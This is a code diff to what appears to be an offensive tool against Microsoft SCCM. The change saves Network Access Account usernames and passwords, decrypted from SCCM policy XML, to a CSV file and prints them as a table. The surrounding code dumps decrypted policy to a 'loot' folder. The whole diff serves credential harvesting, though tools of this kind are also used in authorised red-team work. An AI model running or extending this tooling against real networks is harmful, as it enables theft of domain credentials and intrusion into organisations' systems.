@@ -4,6 +4,8 @@ import requests
 import re
 import time
 import os
+import pandas as pd
+from tabulate import tabulate
 from lib.logger import logger
 from pyasn1.codec.der.decoder import decode
 from pyasn1_modules import rfc5652
@@ -23,6 +25,7 @@ from cryptography.x509 import ObjectIdentifier
 from requests_toolbelt.multipart import decoder
 from requests_ntlm import HttpNtlmAuth
 import xml.etree.ElementTree as ET
+import csv
 
 
 # Who needs just 1 date format :/
@@ -50,6 +53,27 @@ class Tools:
   def write_to_file(input, file):
     with open(file, "w", encoding='utf-8') as fd:
       fd.write(input)
+  
+  @staticmethod
+  def print_table(logs_dir):
+    try:
+        df = pd.read_csv(f"{logs_dir}/csvs/naa_creds.csv").fillna("None")
+        if df.any:
+            logger.info("[*] Showing NAA creds")
+        logger.info(tabulate(df, headers = 'keys', tablefmt = 'grid'))
+    except:
+            logger.info(f"[-] NAA creds csv not found.")
+
+  @staticmethod
+  def write_to_csv(input, logs_dir):
+      fields = ["username", "password"]
+      file = f"{logs_dir}/csvs/naa_creds.csv"
+      with open(file, 'a', newline='') as f:
+            writer = csv.DictWriter(f, fieldnames=fields, escapechar='\\')
+            writer.writeheader()
+            writer.writerows(input)
+      Tools.print_table(logs_dir=logs_dir)  
+
 
 class CryptoTools:
     @staticmethod
@@ -304,6 +328,8 @@ class SCCMTools():
 
     def parse_xml(self, xml_file):
         try:
+            #might need to update this if the weird extra character isn't consistent from the file write
+            cred_dict = []
             if xml_file.endswith("Ȃ"):
                 xml_file = xml_file[:-len("Ȃ")]
                 i = ET.fromstring(xml_file)
@@ -312,7 +338,10 @@ class SCCMTools():
                     network_access_password = instance.find(".//property[@name='NetworkAccessPassword']/value").text
                     clear_user = self.deobfuscate_policysecret(network_access_username).decode('utf-16-le')
                     clear_pass = self.deobfuscate_policysecret(network_access_password).decode('utf-16-le')
+                    creds = {"username":clear_user, "password": clear_pass}
+                    cred_dict.append(creds)
                     logger.info("[+] Got NAA credential: " + clear_user + ":" + clear_pass)
+            Tools.write_to_csv(cred_dict, self.logs_dir)
 
         except ET.ParseError as e:
             print(f"An error occurred while parsing the XML: {e}")
@@ -355,7 +384,7 @@ class SCCMTools():
                     logger.info(f"[+] Done.. decrypted policy dumped to {self.logs_dir}/loot/{self._server.split('.')[0]}_naapolicy.xml")
                 except:
                    logger.info(f"[-] Something went wrong.")
-        #self.parse_xml(policies)
+        
         self.cleanupCertifcate(True)
 
 
